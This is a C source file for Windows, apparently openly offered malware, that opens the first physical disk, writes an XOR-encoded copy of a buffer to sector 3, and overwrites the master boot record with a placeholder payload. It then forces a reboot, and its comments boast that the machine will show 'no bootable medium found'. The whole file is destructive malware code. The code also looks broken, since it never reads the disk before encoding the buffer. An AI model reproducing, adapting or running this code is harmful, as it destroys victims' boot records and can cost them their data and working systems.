/**
* This file is licensed under BSD 3-Clause License
*
* Copyright (c) 2020, magnar-blj
* All rights reserved.
*
* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
*
* 1. Redistributions of source code must retain the above copyright notice, this
*    list of conditions and the following disclaimer.
*
* 2. Redistributions in binary form must reproduce the above copyright notice,
*    this list of conditions and the following disclaimer in the documentation
*    and/or other materials provided with the distribution.
*
* 3. Neither the name of the copyright holder nor the names of its
*    contributors may be used to endorse or promote products derived from
*    this software without specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*
*/

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_WARNINGS
#define MB_BUF_SIZE 0x200
unsigned char payload[MB_BUF_SIZE]; // {your payload};

int main( ) {
	DWORD rd;
	BOOL ok;
	BYTE* pBuffer;
	LPVOID mbr = VirtualAlloc( NULL, MB_BUF_SIZE, MEM_COMMIT, PAGE_READWRITE );
	LPVOID buffer = VirtualAlloc( NULL, MB_BUF_SIZE, MEM_COMMIT, PAGE_READWRITE );
	HANDLE _handle = CreateFile( "\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
	
    if ( _handle == INVALID_HANDLE_VALUE ) {
		printf( "INVALID_HANDLE_VALUE (1)\n" ); //debug only
	}


	BYTE* p = ( BYTE* )mbr;
	
    if ( *p == 0x90 ) {
		CloseHandle( _handle );
		printf( "Already Infected \n" );
		goto exit; // sorry
	}

	CloseHandle( _handle );

	pBuffer = ( BYTE* )buffer;
	
    for ( int i = 0; i < MB_BUF_SIZE; i++, p++, pBuffer++ ) {
		*pBuffer = *p ^ 0x90;
	}
    
	_handle = CreateFileA( "\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0 );
	
    if ( _handle == INVALID_HANDLE_VALUE ) {
		printf("INVALID_HANDLE_VALUE (3)\n" ); //debug only
	}

	SetFilePointer( _handle, 512 * ( 4 - 1 ), NULL, FILE_BEGIN );
	ok = WriteFile( _handle, buffer, MB_BUF_SIZE, &rd, NULL ); // 
	
    if ( !ok ) {
		printf( "Error write data(4)\n" ); // debug only
	}

	memcpy( mbr, payload, 0x1bd );
	SetFilePointer( _handle, 0, NULL, FILE_BEGIN );
	WriteFile( _handle, mbr, MB_BUF_SIZE, &rd, NULL );
	CloseHandle( _handle );
exit:
	VirtualFree( mbr, MB_BUF_SIZE, MEM_RELEASE );
	VirtualFree( buffer, MB_BUF_SIZE, MEM_RELEASE );
	system( "shutdown -r" ); // reboot the pc 
	// -> no bootable medium found 
	// BooOm BiG eXplOsion xD
	return 0;

}
